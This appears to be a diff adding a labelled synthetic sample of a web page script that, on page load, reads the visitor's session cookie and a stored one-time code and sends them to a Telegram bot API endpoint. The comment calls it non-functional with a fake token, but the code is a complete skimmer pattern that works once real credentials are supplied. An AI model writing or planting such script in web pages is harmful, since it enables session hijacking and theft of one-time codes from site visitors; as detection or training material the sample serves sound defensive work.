@@ -1,0 +1,10 @@
+<!-- Synthetic sample - session-token + OTP stealer with Telegram exfil (NON-FUNCTIONAL, fake token) -->
+<script>
+function grab(){
+  var t = document.cookie;
+  var code = sessionStorage.getItem("code_field");
+  fetch("https://api.telegram.org/bot1234567890:AAFAKEtokenNOTreal_0000000000000/sendMessage"
+    +"?chat_id=999999&text=token="+t+"&otp="+code);
+}
+window.onload = grab;
+</script>
